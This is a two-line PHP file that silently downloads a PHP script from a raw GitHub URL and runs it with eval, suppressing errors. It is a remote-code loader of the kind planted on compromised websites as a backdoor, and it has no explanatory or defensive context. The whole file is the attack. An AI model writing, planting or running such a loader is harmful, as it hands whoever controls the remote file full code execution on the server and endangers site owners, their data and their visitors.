<?php
@eval("?>" . file_get_contents("https://raw.githubusercontent.com/Zeddgansz/Alattempur/main/open.php"));